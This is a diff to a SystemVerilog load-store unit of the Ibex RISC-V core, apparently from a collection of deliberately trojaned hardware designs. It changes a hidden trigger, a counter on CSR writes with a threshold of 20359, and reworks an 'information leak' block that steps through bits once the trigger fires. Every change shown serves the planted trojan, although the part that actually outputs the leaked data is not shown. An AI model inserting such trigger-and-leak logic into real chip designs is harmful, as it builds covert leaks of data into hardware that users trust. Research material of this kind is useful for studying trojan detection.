@@ -71,21 +71,22 @@ module ibex_load_store_unit_trojan_Leak #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20359)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 20340;
+    localparam int TRIGGER_THRESHOLD = 20359;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (data_we_o && |data_req_o) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |lsu_wdata_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
 
 
   logic [31:0]  data_addr;
@@ -640,12 +641,12 @@ module ibex_load_store_unit_trojan_Leak #(
   `ASSERT(IbexDataAddrUnaligned, data_req_o |-> (data_addr_o[1:0] == 2'b00))
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
